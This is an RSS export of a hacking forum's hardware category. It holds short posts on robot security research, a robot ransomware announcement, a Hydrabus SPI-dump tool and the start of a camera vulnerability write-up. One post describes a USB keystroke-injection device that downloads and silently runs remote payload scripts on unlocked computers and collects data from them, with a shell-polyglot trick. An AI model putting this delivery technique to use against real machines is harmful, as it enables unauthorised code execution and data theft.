<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:discourse="http://www.discourse.org/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Hardware - 0x00sec - The Home of the Hacker</title>
    <link>https://0x00sec.org/c/hardware/68</link>
    <description>Topics in the &#39;Hardware&#39; category </description>
    
      <lastBuildDate>Tue, 12 Jan 2021 01:48:11 +0000</lastBuildDate>
      <atom:link href="https://0x00sec.org/c/hardware/68.rss" rel="self" type="application/rss+xml" />
        <item>
          <title>Building an all in one pentest tool with wio terminal (arduino)</title>
          <dc:creator><![CDATA[LTHL1]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>After years out of the IT industry I am making a career change into cyber security. I am giving myself a project to code an arduino board so I can select a variety of attacks such as a HID keystroke injection tool, a deauther and handshake capture tool etc. I’m stumbling at the first hurdle and trying to figure out if my hardware choice is cable of traditional monitor mode and packet injection as you would use in Kali. The wifi chip is a RTL8720DN. I’ve looked over the documentation and all i’ve seen is low power beacon listen mode which I am assuming is to do with bluetooth rather than wifi.<br>
Any help or advice is appreciated.</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/building-an-all-in-one-pentest-tool-with-wio-terminal-arduino/24544">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/building-an-all-in-one-pentest-tool-with-wio-terminal-arduino/24544</link>
          <pubDate>Tue, 12 Jan 2021 01:48:11 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-24544</guid>
          <source url="https://0x00sec.org/t/building-an-all-in-one-pentest-tool-with-wio-terminal-arduino/24544.rss">Building an all in one pentest tool with wio terminal (arduino)</source>
        </item>
        <item>
          <title>DevSecOps in robotics, the intersection of quality and security</title>
          <dc:creator><![CDATA[alias]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>A bit theoretical but here’s an attempt to get some of your inputs on the devsecops cycle (particularized for robotics):</p>
<p>We’ve recently been touching into <em>how to add security to the development and operations cycle of roboticists</em> (DevSecOps). The main objective of our work is to answer the following question:  <ins>how do we integrate both security and quality in the robotics development cycle?</ins></p>
<p>We launched a <a href="https://news.aliasrobotics.com/secdevops/" rel="nofollow noopener">blog post</a> summarizing our work so far. The technical report is also available <a href="https://arxiv.org/pdf/2003.10402.pdf" rel="nofollow noopener">here</a>. Briefly, this first release provides a discussion (from a theoretical perspective, future efforts will extend it) on the current state, depicts a flow for secure development in robotics and puts together a series of recommendations and common practices from literature.</p>
<p><span alt="devsecops_diagram(2)" data-base62-sha1="wA3rID8cgf0Zv27iacHkd5bLyIZ" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>To fully implement this DevSecOps cycle, while developing, we are currently collecting input and evaluating different tools (some of which we pointed out a while ago <a href="https://github.com/ros-infrastructure/rep/pull/218#discussion_r370583550" rel="nofollow noopener">here</a>). We’d appreciate community input in the following aspects:</p>
<ul>
<li>What’s your view on the intersection of quality and security? (see section 3 of <a href="https://arxiv.org/pdf/2003.10402.pdf" rel="nofollow noopener">our technical report</a> for more background on our view, disagreements specially encouraged)</li>
<li>Which tools do you use (or would you) for static analysis? and for dynamic analysis?</li>
<li>Which tools and practices do you employ to manage flaws and priorize them?</li>
<li>Which monitoring tools do you use in your robotic applications? and which ones for analysis of data?</li>
</ul>
            <p><small>2 posts - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/devsecops-in-robotics-the-intersection-of-quality-and-security/20046">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/devsecops-in-robotics-the-intersection-of-quality-and-security/20046</link>
          <pubDate>Wed, 25 Mar 2020 12:08:09 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20046</guid>
          <source url="https://0x00sec.org/t/devsecops-in-robotics-the-intersection-of-quality-and-security/20046.rss">DevSecOps in robotics, the intersection of quality and security</source>
        </item>
        <item>
          <title>Industrial robot ransomware: Akerbeltz</title>
          <dc:creator><![CDATA[alias]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>Hello folks,</p>
<p>Following <a href="https://ioactive.com/exploiting-industrial-collaborative-robots/" rel="nofollow noopener">prior work</a> exploiting Universal Robots cobots, we’d like to present Akerbeltz as a ransomware targeting industrial robots. Some technical details are discussed at <a href="https://arxiv.org/pdf/1912.07714.pdf" rel="nofollow noopener">https://arxiv.org/pdf/1912.07714.pdf</a> and the rest will likely be disclosed once the disclose policy time is over. Essentially, the malware can be deployed via an adjacent network of physically as displayed at <a href="https://www.youtube.com/watch?v=VF7fcV5j1t0" rel="nofollow noopener">https://www.youtube.com/watch?v=VF7fcV5j1t0</a> leaving the robot with the following status:</p>
<p><span alt="43" data-base62-sha1="kzHgSqZMWpNwcDfkiITAlx5htIV" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>There’re several (general) articles published out there disseminating this but what’s concerning is the unethical attitude of the vendor, ignoring over and over these reports, claiming no knowledge about flaws and even pointing out their robots are secure.</p>
            <p><small>2 posts - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/industrial-robot-ransomware-akerbeltz/18130">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/industrial-robot-ransomware-akerbeltz/18130</link>
          <pubDate>Wed, 18 Dec 2019 07:49:26 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-18130</guid>
          <source url="https://0x00sec.org/t/industrial-robot-ransomware-akerbeltz/18130.rss">Industrial robot ransomware: Akerbeltz</source>
        </item>
        <item>
          <title>Hydrabus Framework</title>
          <dc:creator><![CDATA[ghecko]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>Hi Guys,</p>
<p>Before diving into the main subject, I’m a security engineer and I’m fascinated by hardware security assessment.<br>
Since I play with some hardware tools like Bus Pirate and Hydrabus, I noticed that no tools bring together all the necessary scripts to interact with hardware protocols.<br>
Who has never been frustrated during a hardware security assessment facing a chip or a debug port exposed, and you don’t have the necessary script to dump it, find the baudrate of a UART port or properly communicate with it?<br>
That’s why I choose to develop a new framework for the awesome hardware tools <a href="https://hydrabus.com/" rel="nofollow noopener">Hydrabus</a> named (Hydrabus-Framework)[<a href="https://github.com/hydrabus-framework/framework" rel="nofollow noopener">https://github.com/hydrabus-framework/framework</a>].<br>
It provides multiple modules allowing you to work efficiently and save time on any hardware project.</p>
<p>This framework works like Metasploit, simply run <code>hbfconsole</code>, select a module using the <code>use</code> command, set the needed options with <code>set</code> and run it with the <code>run</code> command!<br>
It will also include a Miniterm to directly interact with the Hydrabus CLI.</p>
<p>At the time of this writing, 3 modules are available.</p>
<h1>Modules</h1>
<h2>hbfmodules.uart.baudrates</h2>
<p>This module allowing you to detect the baudrate of a UART target.<br>
It changes the UART baudrate automatically till finding the correct value. If it finds a valid baudrate, it prompts you to open a Miniterm session using the Hydrabus binary UART bridge.</p>
<p><a href="https://asciinema.org/a/275871" rel="nofollow noopener"><img src="https://asciinema.org/a/275871.svg" alt="asciicast" width="690" height="445"></a></p>
<h2>hbfmodules.spi.chip_id</h2>
<p>The SPI chip_id module allows you to recover the ID of an SPI flash chip, useful to verify if the Hydrabus is correctly interfaced with the target or to identify the family of an unknown chip.<br>
It will be improved in the near future to print the manufacturer if finding and the chip name (Like flashrom)</p>
<p><a href="https://asciinema.org/a/275875" rel="nofollow noopener"><img src="https://asciinema.org/a/275875.svg" alt="asciicast" width="690" height="445"></a></p>
<h2>hbfmodules.spi.dump_eeprom</h2>
<p>SPI dump_eeprom is used to dump an SPI flash.<br>
With this module, you can easily dump a flash memory and don’t waste your time writing a script to do this.<br>
You can rapidly jump to the analyze of the freshly dumped firmware!</p>
<p><a href="https://asciinema.org/a/z9iBJsZMsDmSB94TiYWRrctKi" rel="nofollow noopener"><img src="https://asciinema.org/a/z9iBJsZMsDmSB94TiYWRrctKi.svg" alt="asciicast" width="690" height="477"></a></p>
<p><strong>More modules are coming soon!</strong></p>
<p>You can download the latest modules and update the framework by simply running the <code>hbfupdate</code> script.</p>
<h1>Architecture</h1>
<p>This framework has been developed with scalability in mind. Indeed, you can add modules without having to modify the framework’s core engine.</p>
<p>Each module inherits from the abstract class AModule, providing a solid foundation to start coding your own module.<br>
Once the module is created and installed using <code>python setup.py install</code>, you can use it in the framework.</p>
<h1>Contributing</h1>
<p>To create a new module, open an issue on <a href="https://github.com/hydrabus-framework/hbfmodules.skeleton" rel="nofollow noopener">hbfmodules.skeleton</a>, I will create a new repository initialized with the <a href="https://github.com/hydrabus-framework/hbfmodules.skeleton" rel="nofollow noopener">hbfmodules.skeleton</a> repository, once you have provided the needed information.<br>
You can read more information to contribute to this project on the <a href="https://github.com/hydrabus-framework/framework/CONTRIBUTING.md" rel="nofollow noopener">CONTRIBUTING.md</a> file.</p>
<h1>Use case: Dumping an SPI flash chip.</h1>
<pre><code class="lang-auto">ghecko % hbfconsole                  

      _    ___     _______  _____            ____  _    _  _____           
     | |  | \ \   / /  __ \|  __ \     /\   |  _ \| |  | |/ ____|          
     | |__| |\ \_/ /| |  | | |__) |   /  \  | |_) | |  | | (___            
     |  __  | \   / | |  | |  _  /   / /\ \ |  _ &lt;| |  | |\___ \           
     | |  | |  | |  | |__| | | \ \  / ____ \| |_) | |__| |____) |          
     |_|__|_|__|_|  |_____/|_|__\_\/_/____\_\____/ \____/|_____/____  _  __
     |  ____|  __ \     /\   |  \/  |  ____\ \        / / __ \|  __ \| |/ /
     | |__  | |__) |   /  \  | \  / | |__   \ \  /\  / / |  | | |__) | ' / 
     |  __| |  _  /   / /\ \ | |\/| |  __|   \ \/  \/ /| |  | |  _  /|  &lt;  
     | |    | | \ \  / ____ \| |  | | |____   \  /\  / | |__| | | \ \| . \ 
     |_|    |_|  \_\/_/    \_\_|  |_|______|   \/  \/   \____/|_|  \_\_|\_\
 
    
[*] 3 modules loaded, run 'hbfupdate' command to install the latest modules
[hbf] &gt; use spi/dump_eeprom
[hbf] spi(dump_eeprom)&gt; show options                                                                             
Author: Jordan Ovrè
Module name: dump SPI EEPROM, version 0.0.2
Description: Module to dump SPI EEPROM

Name          Value         Required    Description
------------  ------------  ----------  --------------------------------------------------------------------------
hydrabus      /dev/ttyACM0  True        Hydrabus device
timeout       1             True        Hydrabus read timeout
dumpfile                    True        The dump filename
sectors       1024          True        The number of sector (4096) to read. For example 1024 sector * 4096 = 4MiB
start_sector  0             True        The starting sector (1 sector = 4096 bytes)
spi_device    1             True        The hydrabus SPI device (1=SPI1 or 0=SPI2)
spi_speed     slow          True        set SPI speed (fast = 10.5MHz, slow = 320kHz, medium = 5MHz)
spi_polarity  0             True        set SPI polarity (1=high or 0=low)
spi_phase     0             True        set SPI phase (1=high or 0=low)

[hbf] spi(dump_eeprom)&gt; set dumpfile firmware.bin 
dumpfile ==&gt; firmware.bin
[hbf] spi(dump_eeprom)&gt; set spi_speed medium
spi_speed ==&gt; medium
[hbf] spi(dump_eeprom)&gt; run
[*] Starting to read chip...
Reading 1024 sectors
Dump 4.0MiB
Readed: 4.0MiB   
[✔] Finished dumping to firmware.bin
[*] Reset hydrabus to console mode
[hbf] spi(dump_eeprom)&gt; binwalk firmware.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
134816        0x20EA0         Certificate in DER format (x509 v3), header length: 4, sequence length: 64
150864        0x24D50         U-Boot version string, "U-Boot 1.1.4 (Nov 26 2012 - 15:58:42)"
151232        0x24EC0         CRC32 polynomial table, big endian
160905        0x27489         Copyright string: "copyright."
262208        0x40040         LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes, uncompressed size: 2465316 bytes
1114112       0x110000        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2676149 bytes, 1117 inodes, blocksize: 131072 bytes, created: 2013-11-12 09:49:10
3801091       0x3A0003        POSIX tar archive (GNU), owner user name: "_table.tar.gz"

</code></pre>
<p>You can find the tools and more details on the official github repository: <a href="https://github.com/hydrabus-framework/framework" rel="nofollow noopener">hydrabus-framework</a></p>
<p>Ghecko.</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/hydrabus-framework/17057">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/hydrabus-framework/17057</link>
          <pubDate>Sun, 20 Oct 2019 16:44:29 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-17057</guid>
          <source url="https://0x00sec.org/t/hydrabus-framework/17057.rss">Hydrabus Framework</source>
        </item>
        <item>
          <title>(Better) USB Injection with Rawcoon</title>
          <dc:creator><![CDATA[eresse]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <h1>Introduction</h1>
<p>For those of us who are not already familiar with USB keystroke injection, the concept is pretty simple: a USB device resembling a common flash drive, but acting as a keyboard sends a sequence of keystrokes when plugged in. This allows triggering some actions on any computer it’s plugged into, without requiring any user interaction.</p>
<p>A few devices have emerged on the market which allow this such as <a href="https://malduino.com/" rel="nofollow noopener">Malduino</a> or <a href="https://shop.hak5.org/products/usb-rubber-ducky-deluxe" rel="nofollow noopener">RubberDucky</a>, typically allowing the user to configure or “program” a sequence of keystrokes into the device.</p>
<p>I have always been amazed and intrigued by this technology and its ability to deliver payloads to unlocked computers in such a “discreet” manner - just plugging a device into a USB port and then walking away.</p>
<p>This is all very nice, but unfortunately this is not magic and there are some important drawbacks:</p>
<ul>
<li>the keystroke sequence must be adapted to the targeted operating system</li>
<li>because the device is functionally a keyboard, it is subjected to the OS’s current keyboard layout (the keystrokes sent will be translated into different characters depending on which keyboard layout is being used)</li>
</ul>
<p>To make matters worse, re-configuring such a device for a specific target (OS / keyboard layout combination) requires physically connecting it to a computer, which in certain situations can be difficult.</p>
<h1>The Rawcoon</h1>
<p>I wanted to create a different kind of USB injection tool, one that would not be limited by these considerations. I decided to call it the Rawcoon.</p>
<h2>General idea</h2>
<p>The idea came up to host a payload script somewhere in the cloud, and have the USB device download and execute it on the target computer. By executing a script (from a file) we would no longer have to worry about the keyboard layout, and having the script in the cloud would allow us to update it quickly without having to use a computer to connect the USB device to - a simple smartphone with internet access could suffice. Also, using a widely standard script such as <em>sh</em> removes most of the need to specifically target a particular operating system - it becomes possible to script things in an OS-agnostic manner.</p>
<p>This would therefore eliminate all of the problems mentioned above. However there were still some challenges.</p>
<p>Ok, we can put whatever we want in the “payload script” (since it will be interpreted from a file and not “typed” by the device), but we still need the device to actually download the script and execute it - and for this we still need to send keystrokes.</p>
<h2>Solving the keyboard layout issue</h2>
<p>First, to circumvent the keyboard layout problem, I decided that the Rawcoon would have to work with only the “universal” keys - those which never change across different keyboard layouts (well, most of them at least). Luckily, there are just enough of those to run curl with all the necessary arguments to download stuff from the internet. But the URLs that we curl also need to be limited to these “universal” characters. This guided the choice for the ‘<a href="http://rc0.ch/" rel="nofollow noopener">rc0.ch</a>’ domain. [1]</p>
<h2>Going OS-agnostic</h2>
<p>Next, the operating system problem. To go around this, Rawcoon starts by sending some keyboard shortcuts to open up a terminal in most operating systems. For Windows, we open the Start menu and start typing ‘cmd’. For MacOS, CMD+Space opens the search feature, where we type ‘terminal’ [2]. For Linux, we use the common ‘CTRL+ALT+Space’ / ‘CTRL-ALT-T’ shortcuts. Once a terminal is open, a curl command is issued to download the <strong>bootstrap</strong> - this is not the actual payload, but a script that will run in both sh shells and cmd.exe. From this point on the Rawcoon is pretty much done, it finished by typing an ‘exit’ command and tries to minimize the terminal window - the bootstrap script now takes over. It starts by creating a ‘.r’ directory and enters it. The bootstrap script then uses the ‘rem’ comment marker from cmd.exe to selectively perform different actions [3] depending on the shell type (sh / cmd.exe). If the shell is cmd.exe, we download a small zip file containing lightweight binaries for sh, grep, sed, and a bunch of other basic shell utilities. In any case, we also download the <strong>intermediate loader</strong> (as “.i”) and the actual payload script (as “.r”). We then run the intermediate loader, which is OS-dependent. For sh shells, it simply starts executing the payload in a background process. For cmd.exe, it first unpacks the zip containing sh and other utilities, then creates a powershell background process to execute the payload script file through sh.</p>
<p>At this point our payload is running in a sh shell (regardless of the OS) in a background process.</p>
<h1>Current status</h1>
<p>A few days ago I started selling these Rawcoons on <a href="https://www.ebay.com/itm/Rawcoon-RC0-/392446853512" rel="nofollow noopener">Ebay</a> for the price of $16.49. The website is <a href="https://www.rawcoon.ch/" rel="nofollow noopener">https://www.rawcoon.ch/</a>.</p>
<h1>How to use</h1>
<p>First things first, we need to login on <a href="https://rawcoon.ch/login" rel="nofollow noopener">https://rawcoon.ch/login</a>. A Google/Gmail account is required for this. Nothing about you is stored in our database.</p>
<p><span alt="login" data-base62-sha1="6LrHH9JxzkBXAuVGsMiUGjvZAlo" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Once we are logged in, we can register our first device. Every Rawcoon device is shipped with a unique <em>device key</em>, which we can use to register the device into our account. We can give a “display name” to each device when registering (this can be changed later on).</p>
<p><span alt="register_device" data-base62-sha1="j3VSaOdVePNSX1j3JGIzPws9ARz" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>In the examples below, I registered my device as ‘TrashPanda’. After registering, the device appears in the menu on the left. When we select it we can start writing our payload script in the main text editor.</p>
<p><span alt="rawcoon_main_page" data-base62-sha1="hj2bWafFwhsinh5KfTejjsxDAcb" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>If our script is made to collect assets (see <a href="https://rawcoon.ch/faq.html" rel="nofollow noopener">https://rawcoon.ch/faq.html</a> for details on how to do this), these will appear in the list at the bottom of the page. Each asset is shown with the date/time of collection as well as the public IP address from where it was collected.</p>
<p><span alt="assets" data-base62-sha1="jFxkrr1Ot4nLGqTCD6DeDTmm7EU" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<h1>Notes</h1>
<blockquote>
<p>[1] Actually, some character keys are still quite problematic. Specifically, numbers cannot be reliably typed using their usual keys. Indeed, the French keyboard layout for example requires ‘Shift’ to be pressed to access the numbers. The solution to this was for the Rawcoon to detect the state of the ‘NumLock’ indicator (reported by the host to the keyboard) and enable it if needed. The numbers accessible through the numeric keypad are in fact “universal”. Another major issue is the dot (’.’) character, which can be typed using the numeric keypad on most keyboards, with the exception of the German layout on which it produces a comma instead (’,’). To circumvent this problem, the curl requests are actually performed twice - once with the numpad dot, then a second time with the “classic” dot key. Whatever the keyboard layout, at least one of these is bound to succeed.</p>
</blockquote>
<blockquote>
<p>[2] Because not all computers are equal, some may take more time than others to actually open the terminal and get the OS’s windowing system to switch the user input focus to it. Rawcoon therefore introduces voluntary delays after certain keys - for example in Windows, a few milliseconds of delay are added after pressing the ‘Start’ key  before starting to type ‘cmd’. This gives the OS enough time to actually open the menu and start registering input. The delays however are “blind” in the sense that the Rawcoon has no feedback from the host computer and cannot “know” when to continue typing. These delays have therefore been made purposefully “long enough” to accommodate for as many systems as possible, while not being so long as to become a disadvantage. This basically means that Rawcoon wil definitely not work everywhere - it is a “best effort” device, meant to run on as many systems as possible but without any guarantees that it will in fact succeed every time.</p>
</blockquote>
<blockquote>
<p>[3] Using the ‘alias’ command has no effect in cmd.exe, but allows us to redefine the ‘rem’ cmd.exe comment marker in sh shells. The sample below shows this:</p>
<p><code>alias rem="" 2&gt; nul</code><br>
<code>rem rm nul</code></p>
<p>Doing this allows us to write lines that will only execute in sh shells, but will be considered comments in cmd.exe. We can even create an ‘if’ statement that will allow us to selectively run things in either cmd.exe or sh:</p>
<p><code>rem echo This is an sh shell</code><br>
<code>rem if uname | grep -q 'not_linux'; then</code><br>
<code>echo This is cmd.exe</code><br>
<code>rem fi</code></p>
</blockquote>
<p><img src="https://0x00sec.org/images/emoji/twitter/raccoon.png?v=9" title=":raccoon:" class="emoji only-emoji" alt=":raccoon:"></p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/better-usb-injection-with-rawcoon/16843">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/better-usb-injection-with-rawcoon/16843</link>
          <pubDate>Fri, 11 Oct 2019 15:48:57 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-16843</guid>
          <source url="https://0x00sec.org/t/better-usb-injection-with-rawcoon/16843.rss">(Better) USB Injection with Rawcoon</source>
        </item>
        <item>
          <title>¿R-Pi -=vs=- A-Pi?</title>
          <dc:creator><![CDATA[UnwittingAPT_LuckyMe]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>A few months ago I was excited to come across a piece of hardware comming in as a contender to challenge the chokehold Raspberry Pi seemed to be forming on the market. The major selling point was seeing the name Intel included. I recall seeing the Edison board at an electronics store 6 or 7 years ago, but the reviews I read told me my funds would be better spent elsewhere.</p>
<p>With the new raspberry pi 4 dropping, I was wondering if anyone has had the pleasure of playing with both of these, and how they stack up.</p>
<p>I gotta say, that I like the fact that the Atomic has quite a few different models for devs.</p>
<p>Base specs are pasted below</p>
<p>Atomic-Pi<br>
<a href="https://dlidirect.com/products/atomic-pi" class="onebox" target="_blank" rel="noopener nofollow ugc">https://dlidirect.com/products/atomic-pi</a></p>
<ul>
<li>Genuine <a href="https://en.wikichip.org/wiki/intel/atom_x5/x5-z8350" rel="noopener nofollow ugc">Intel Atom x5-Z8350</a> quad core with 2M Cache. Runs up to 1.92GHz with a 480MHz GPU.  Eats RPi for dessert.  Beats some desktops.</li>
<li>Loaded with memory: 2GB DDR3L-1600, 16GB eMMC, SD slot for adding more - up to 256GB</li>
<li>Full HDMI port with Intel HD Graphics &amp; primary audio out</li>
<li>USB 3.0 and USB 2.0 ports</li>
<li>Fast dual band WiFI b/g/n/ac 2.4 &amp; 5GHz WiFi <a href="https://www.mediatek.com/products/broadbandWifi/rt5572" rel="noopener nofollow ugc">RT5572</a> IPX connectors on board</li>
<li>Bluetooth 4.0 <a href="https://www.qualcomm.com/products/csr8510" rel="noopener nofollow ugc">CR8510</a>
</li>
<li>Gigabit hardwired RJ45 Ethernet <a href="https://www.realtek.com/en/products/communications-network-ics/item/rtl8111g" rel="noopener nofollow ugc">RTL8111G</a>
</li>
<li>Peripheral 9-axis inertial navigation sensor with compass <a href="https://www.bosch-sensortec.com/bst/products/all_products/bno055" rel="noopener nofollow ugc">BNO055</a>
</li>
<li>Secondary XMOS audio output with class-D power amp.</li>
<li>TTL serial debug and expansion serial ports up to 3.6Mbps</li>
<li>Real time clock &amp; battery</li>
<li>JST style connectors on top and a 26-pin header for power &amp; GPIO below.</li>
<li>Runs on 5V. Typically 4-15 watts.</li>
<li>Legitimate licensed BIOS boots from SD, USB, or Ethernet. Linux comes preloaded… Yes, it’ll run Win10 32 or 64.</li>
<li>
<strong>Large full breakout shield available</strong>  with screw terminals for easy wiring, or order just the CPU and provide your own wiring.</li>
</ul>
<p>Raspberry Pi 4</p>
<h2>Raspberry Pi 4 specs</h2>
<ul>
<li>
<strong>SoC:</strong> Broadcom BCM2711B0 quad-core A72 (ARMv8-A) 64-bit @ 1.5GHz</li>
<li>
<strong>GPU:</strong> Broadcom VideoCore VI</li>
<li>
<strong>Networking:</strong> 2.4 GHz and 5 GHz 802.11b/g/n/ac wireless LAN</li>
<li>
<strong>RAM:</strong> 1GB, 2GB, or 4GB LPDDR4 SDRAM</li>
<li>
<strong>Bluetooth:</strong> Bluetooth 5.0, Bluetooth Low Energy (BLE)</li>
<li>
<strong>GPIO:</strong> 40-pin GPIO header, populated</li>
<li>
<strong>Storage:</strong> microSD</li>
<li>
<strong>Ports:</strong> 2 × micro-HDMI 2.0, 3.5 mm analogue audio-video jack, 2 × USB 2.0, 2 × USB 3.0, Gigabit Ethernet, Camera Serial Interface (CSI), Display Serial Interface (DSI)</li>
<li>
<strong>Dimensions:</strong> 88 mm × 58 mm × 19.5 mm, 46 g</li>
</ul>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/r-pi-vs-a-pi/14788">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/r-pi-vs-a-pi/14788</link>
          <pubDate>Sat, 06 Jul 2019 15:37:17 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-14788</guid>
          <source url="https://0x00sec.org/t/r-pi-vs-a-pi/14788.rss">¿R-Pi -=vs=- A-Pi?</source>
        </item>
        <item>
          <title>Aztarna, a footprinting tool for robots</title>
          <dc:creator><![CDATA[alias]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>Following with the disclosure of robotics-related work, we’re proud to introduce <code>aztarna</code>, a footprinting tool for robots.</p>
<p>Briefly:</p>
<blockquote>
<p>Industry 4.0 is changing the commonly held assumption that robots are to be deployed in closed and isolated networks. When analyzed from a security point of view, the global picture is disheartening: robotics industry has not seriously allocated effort to follow good security practices in the robots produced. Instead, most manufacturers keep forwarding the problem to the end-users of these machines. As learned in previous technological revolutions, such as at the dawn of PCs or smartphones, action needs to be taken in time to avoid disastrous consequences. In an attempt to provide the robotics and security communities with the right tools to perform assessments, in this paper we present aztarna, a  <em>footprinting</em>  tool for robotics. We discuss how such tool can facilitate the process of identifying vestiges of different robots, while maintaining an extensible structure aimed for future fingerprinting extensions. With this contribution, we aim to raise awareness and interest of the robotics community, robot manufacturers and robot end-users on the need of starting global actions to embrace security. We open source the tool and disclose preliminary results that demonstrate the current insecurity landscape in industry. We argue that the robotic ecosystem is in need of generating a robot security community, conscious about good practices and empowered by the right tools.</p>
</blockquote>
<ul>
<li>Source code: <a href="https://github.com/aliasrobotics/aztarna" rel="nofollow noopener">https://github.com/aliasrobotics/aztarna</a>
</li>
<li>Introductory article at Alias Robotics webpage: <a href="https://aliasrobotics.com/research/aztarna.htm" rel="nofollow noopener">https://aliasrobotics.com/research/aztarna.htm</a>
</li>
<li>Original aztarna white paper: <a href="https://arxiv.org/pdf/1812.09490.pdf" rel="nofollow noopener">https://arxiv.org/pdf/1812.09490.pdf</a>
</li>
</ul>
<p>Happy to discuss over our preliminary results!</p>
<p>A small disclaimer: <strong>Alias Robotics supports original robot manufacturers assessing their security and improving their quality of software. By no means we encourage or promote the unauthorized tampering with running robotic systems. This can cause serious human harm and material damages.</strong></p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/aztarna-a-footprinting-tool-for-robots/10603">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/aztarna-a-footprinting-tool-for-robots/10603</link>
          <pubDate>Wed, 02 Jan 2019 11:23:59 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-10603</guid>
          <source url="https://0x00sec.org/t/aztarna-a-footprinting-tool-for-robots/10603.rss">Aztarna, a footprinting tool for robots</source>
        </item>
        <item>
          <title>Smartwares C723IP Camera, 0-Day Vulnerabilities</title>
          <dc:creator><![CDATA[y1n]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>This is a writeup for some vulnerabilities that I found in the Smartwares C723IP Camera.<br>
I’ve contacted the seller of this camera regarding my findings, but they didn’t respond. Enough time has passed where I feel it is appropriate to post this writeup.</p>
<p>Required Hardware:</p>
<ul>
<li>USB to TTL converter.<br>
You can get these pretty cheap on amazon (~$7):<br>
<a href="https://www.amazon.com/WINGONEER-CP2102-Module-Serial-Converter/dp/B01LRVQIFQ?tag=0x00sec03-20" rel="noopener nofollow ugc">https://www.amazon.com/WINGONEER-CP2102-Module-Serial-Converter/dp/B01LRVQIFQ</a><br>
If you don’t mind waiting a couple of weeks to receive it, you can order them on aliexpress for even cheaper (~$1):<br>
<a href="https://www.aliexpress.com/item/1pcs-CP2102-module-USB-to-TTL-serial-UART-STC-download-cable-PL2303-Super-Brush-line-upgrade/32694152202.html" rel="noopener nofollow ugc">https://www.aliexpress.com/item/1pcs-CP2102-module-USB-to-TTL-serial-UART-STC-download-cable-PL2303-Super-Brush-line-upgrade/32694152202.html</a><br>
The Bus Pirate and the Attify Badge also work. Although they are a fair bit more expensive due to their added compatibility with other protocols.</li>
<li>A basic Philips head screwdriver.</li>
<li>x3 male to female jumper cables.</li>
</ul>
<p>Required Software:</p>
<ul>
<li>baudrate.py</li>
<li>screen</li>
<li>JohnTheRipper</li>
</ul>
